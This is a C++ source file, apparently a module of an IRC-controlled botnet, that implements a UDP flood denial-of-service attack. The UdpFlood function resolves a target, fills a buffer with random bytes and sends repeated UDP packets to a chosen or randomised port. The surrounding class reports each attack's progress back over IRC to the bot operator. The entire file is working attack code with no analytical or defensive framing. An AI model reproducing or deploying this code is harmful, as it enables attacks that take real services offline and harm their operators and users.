/* 
   udp flood
*/

#include "main.h"
#include "udpflood.h"
#include "mainctrl.h"
#include "utility.h"

CDDOSUDPFlood::CDDOSUDPFlood() { 
	m_sDDOSName.Assign("udp"); 
}

long UdpFlood(char *target, int times, int size, int delay, int port);

void CDDOSUDPFlood::StartDDOS()
{	
	g_cMainCtrl.m_cIRC.SendFormat(
		m_bSilent, m_bNotice, m_sReplyTo.Str(), 
		"%s: %s:%u (%ut/%ub/%dms)", 
		m_sDDOSName.CStr(), 
		m_sHost.CStr(),
		m_iPort, 
		m_iNumber,
		m_iSize, 
		m_iDelay
	);
	
	CString sReply;

	if(UdpFlood(
		m_sHost.Str(), 
		m_iNumber,
		m_iSize, 
		m_iDelay,
		m_iPort
		))
	{
		sReply.Format(
			"%s: %s:%d done", 
			m_sDDOSName.CStr(), 
			m_sHost.CStr(),
			m_iPort, 
			m_iNumber
		);
	}

	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), sReply.CStr());
}

long UdpFlood(char *target, int times, int size, int delay, int port)
{
	SOCKET usock; 
	usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	IN_ADDR iaddr; 
	LPHOSTENT hostent = NULL; 
	int i;
	SOCKADDR_IN ssin; 
	memset(&ssin, 0, sizeof(ssin)); 
	ssin.sin_family = AF_INET;

	iaddr.s_addr = inet_addr(target);  
	char pbuff[65500];

	if (iaddr.s_addr == INADDR_NONE) 
		hostent = gethostbyname(target);

	if (hostent == NULL && iaddr.s_addr == INADDR_NONE) 
		return 0;

	if (hostent != NULL) 
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

	else 
		ssin.sin_addr = iaddr;

	if (port == 0) 
		ssin.sin_port = htons((rand() % 65500) + 1); 
	else 
		ssin.sin_port = htons(port);

	if (port < 1) 
		port = 1;

	if (port > 65535) 
		port = 65535;

	if (delay==0)
		delay=1;

	times=times/10;

	for (i = 0; i < size; i++) 
		pbuff[i] = (rand() % 255);

	while (times-- > 0  && g_cMainCtrl.m_cDDOS.m_bDDOSing) 
	{
		for (i = 0; i < 11; i++)
		{
			sendto(usock, pbuff, size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(delay);
		}
		if (port == 0) 
			ssin.sin_port = htons((rand() % 65500) + 1);
	}
	return 1;
}	
